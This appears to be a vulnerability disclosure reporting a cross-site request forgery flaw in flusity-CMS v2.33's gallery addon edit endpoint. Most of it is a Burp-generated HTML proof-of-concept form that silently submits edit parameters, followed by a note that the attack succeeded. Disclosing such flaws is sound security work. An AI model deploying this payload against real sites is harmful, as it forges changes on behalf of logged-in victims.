target:https://github.com/flusity/flusity-CMS
version: v2.33

flusity-CMS v2.33 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component /cover/addons/info_media_gallery/action/edit_addon_post.php

![1](https://github.com/TinkAnet/cve/assets/118334129/c758fea1-c3a3-4a97-88f0-435b822d341f)


Poc:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/cover/addons/info_media_gallery/action/edit_addon_post.php" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="mode" value="edit" />
      <input type="hidden" name="addon&#95;post&#95;edit&#95;id" value="4" />
      <input type="hidden" name="id" value="19" />
      <input type="hidden" name="addon&#95;place&#95;id" value="8" />
      <input type="hidden" name="addon&#95;menu&#95;id" value="0" />
      <input type="hidden" name="gallery&#95;name" value="12345" />
      <input type="hidden" name="gallery&#95;css&#95;style&#95;settings" value="dark" />
      <input type="hidden" name="img&#95;w" value="0" />
      <input type="hidden" name="submit" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


```

![1](https://github.com/TinkAnet/cve/assets/118334129/3bd3384f-124a-4e23-8300-8e27b14900eb)


Successed

![3](https://github.com/TinkAnet/cve/assets/118334129/dbaebdd3-9829-4333-8d26-682028e83dd5)
